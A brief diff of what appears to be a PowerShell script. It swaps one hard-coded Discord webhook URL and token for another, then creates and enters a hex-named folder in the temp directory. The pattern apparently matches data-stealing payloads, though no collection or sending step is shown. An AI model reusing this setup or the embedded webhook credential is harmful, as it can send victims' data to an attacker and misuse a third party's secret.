@@ -1,4 +1,4 @@
-$webhookUri='https://discord.com/api/webhooks/1094613303243837611/7mlF6wb-dnWttbIWPzUtAA5sZOXDvBxouP2sSRyE-CsxHiUq3pt0smAlrLBXtTWN-REq';
+$webhookUri='https://discord.com/api/webhooks/1094979082145497119/J2iOhtS2IxbSs7X94EPeKPJW9p9HDxmUaaDU1NGkThR3dJW0E3LmyYIy3pERZ5kCcAWu';
 New-Item $env:temp -Name "476F6F6420426F7921" -ItemType "directory";
 Set-Location -Path "$env:temp\476F6F6420426F7921";
 
